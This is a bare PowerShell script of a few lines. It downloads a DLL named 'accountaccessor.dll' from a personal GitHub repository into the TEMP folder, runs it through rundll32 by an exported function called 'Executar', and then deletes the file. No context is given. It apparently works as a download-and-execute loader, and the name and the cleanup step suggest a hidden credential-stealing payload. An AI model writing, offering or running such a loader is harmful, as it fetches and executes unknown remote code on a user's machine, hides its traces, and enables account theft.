$url = "https://raw.githubusercontent.com/Matheuskkal/yznrS/refs/heads/main/accountaccessor.dll"
$tempDll = "$env:TEMP\accountaccessor.dll"
Invoke-WebRequest -Uri $url -OutFile $tempDll
rundll32.exe $tempDll, Executar
Remove-Item $tempDll
